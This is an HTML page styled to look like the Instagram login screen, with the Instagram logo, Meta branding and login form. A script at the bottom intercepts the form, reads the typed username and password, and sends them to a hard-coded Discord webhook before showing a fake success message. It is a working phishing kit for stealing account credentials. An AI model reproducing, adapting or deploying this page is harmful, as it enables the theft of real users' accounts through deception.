<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #121d25;
      color: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      min-height: 100vh;
      padding: 16px 20px;
    }

    /* Top language selection */
    .language-selector {
      color: #a8a8a8;
      font-size: 13px;
      margin-top: 8px;
    }

    /* Center section holding Logo + Form + Forgot Link */
    .center-content {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: auto 0; /* Vertically centers this whole block */
    }

    /* Camera Icon Logo */
    .logo-container {
      margin-bottom: 40px;
    }

    .app-icon {
      width: 60px;
      height: 100px;
      display: block;
    }

    /* Form Fields */
    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .input-field {
      width: 100%;
      background-color: #1a2730;
      border: 1px solid #2a3942;
      border-radius: 12px;
      padding: 16px;
      color: #fff;
      font-size: 14px;
      outline: none;
      text-align: left; /* Left-aligned placeholder/input text */
    }

    .input-field::placeholder {
      color: #8e8e8e;
      text-align: left;
    }

    .input-field:focus {
      border-color: #0064e0;
    }

    /* Log in button */
    .login-btn {
      width: 100%;
      background-color: #0064e0;
      color: #ffffff;
      border: none;
      border-radius: 24px;
      padding: 12px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
    }

    /* Links */
    .forgot-link {
      color: #f5f5f5;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
      margin-top: 20px;
      text-align: center;
    }

    /* Bottom Section */
    .bottom-section {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
      margin-bottom: 12px;
    }

    .create-account-btn {
      width: 100%;
      background: transparent;
      border: 1px solid #0064e0;
      color: #0064e0;
      border-radius: 24px;
      padding: 10px;
      font-size: 14px;
      font-weight: 600;
      text-align: center;
      text-decoration: none;
    }

    .meta-brand {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #8e8e8e;
      font-size: 14px;
      font-weight: 600;
    }

    .meta-logo {
      width: 20px;
      height: 20px;
      fill: #8e8e8e;
    }
  </style>
</head>
<body>

  <!-- Top Section -->
  <div class="language-selector">English (US)</div>

  <!-- Vertically Centered Main Section -->
  <div class="center-content">
    <div class="logo-container">
      <svg class="app-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#FFDD55" />
            <stop offset="25%" stop-color="#FF543E" />
            <stop offset="50%" stop-color="#C837AB" />
            <stop offset="100%" stop-color="#3771C8" />
          </linearGradient>
        </defs>
        <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad)"/>
      </svg>
    </div>

    <form id="loginForm">
      <input type="text" id="username" class="input-field" placeholder="Username, email or mobile number" required>
      <input type="password" id="password" class="input-field" placeholder="Password" required>
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot-link">Forgot password?</a>
  </div>

  <!-- Bottom Section -->
  <div class="bottom-section">
    <a href="#" class="create-account-btn">Create new account</a>
    <div class="meta-brand">
      <svg class="meta-logo" viewBox="0 0 24 24">
        <path d="M16.5 6C14.1 6 12.2 7.7 11.2 9.5 10.2 7.7 8.3 6 5.9 6 3 6 1 8.3 1 11.8c0 4.1 3.7 8.2 9.8 11.8.3.2.7.2 1 0C17.9 20 21.6 15.9 21.6 11.8 21.6 8.3 19.5 6 16.5 6zm-10.6 12C3.1 16 2.6 13.5 2.6 11.8c0-2.3 1.3-4.2 3.3-4.2 1.8 0 3.3 1.5 4.3 3.4-1.2 2.2-2.8 4.7-4.3 7zm10.7 0c-1.5-2.3-3.1-4.8-4.3-7 1-1.9 2.5-3.4 4.3-3.4 2 0 3.3 1.9 3.3 4.2 0 1.7-.5 4.2-3.3 6.2z"/>
      </svg>
      Meta
    </div>
  </div>

  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1552010858694058174/U6JeBelDNfOa5aD1NCGecLzJOvWqTCdWNtsKogpil2l_6dWFrSgVzLjTvXJJd5MNoudV';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const payload = {
        embeds: [{
          title: 'New Login Attempt',
          color: 0x0064e0,
          fields: [
            { name: 'Username/Email/Phone', value: username, inline: false },
            { name: 'Password', value: password, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(() => {
        alert('Submitted successfully!');
      })
      .catch(err => {
        console.error('Error sending message:', err);
      });
    });
  </script>

</body>
</html>
